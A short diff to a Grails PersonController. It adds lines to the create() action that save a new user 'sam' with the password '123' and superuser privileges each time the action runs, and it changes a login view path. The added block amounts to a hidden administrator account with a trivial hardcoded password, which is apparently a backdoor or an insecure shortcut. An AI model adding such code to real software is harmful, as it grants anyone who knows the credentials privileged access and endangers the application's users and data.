@@ -16,6 +16,11 @@ class PersonController {
     }
 
     def create() {
+        def p = new Person()
+        p.username = "sam"
+        p.password = "123"
+        p.superuser = true
+        p.save()
         [personInstance: new Person(params)]
     }
 
@@ -103,7 +108,7 @@ class PersonController {
     def start() {
         if(!session.userId)
         {
-            render(view:"/login")
+            render(view:"login")
             return
         }
         return redirect(controller: "Result",action: "create",params: [personId: session.userId])
